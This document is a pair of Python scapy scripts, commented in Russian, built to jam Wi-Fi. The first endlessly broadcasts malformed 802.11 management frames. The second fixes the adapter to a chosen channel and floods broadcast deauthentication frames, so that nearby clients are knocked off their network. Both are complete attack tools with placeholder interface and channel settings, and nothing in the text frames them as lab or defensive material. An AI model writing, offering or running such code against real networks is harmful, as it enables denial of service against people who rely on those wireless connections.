from scapy.all import *
import time

def protocol_jamming(interface):
    # Бесконечный цикл для отправки некорректных пакетов
    while True:
        packet = RadioTap() / Dot11(type=0, subtype=0, addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55") / Raw(load="A"*100)
        sendp(packet, iface=interface, loop=1, inter=0.1)
        time.sleep(0.1)

if __name__ == "__main__":
    interface = "wlan0"  # Замените на ваш интерфейс
    protocol_jamming(interface)

###
from scapy.all import *
import time

def channel_jamming(interface, channel):
    # Устанавливаем канал на адаптере
    os.system(f"iwconfig {interface} channel {channel}")
    
    # Бесконечный цикл для отправки пакетов
    while True:
        packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55") / Dot11Deauth()
        sendp(packet, iface=interface, loop=1, inter=0.1)
        time.sleep(0.1)

if __name__ == "__main__":
    interface = "wlan0"  # Замените на ваш интерфейс
    channel = 6  # Замените на нужный канал
    channel_jamming(interface, channel)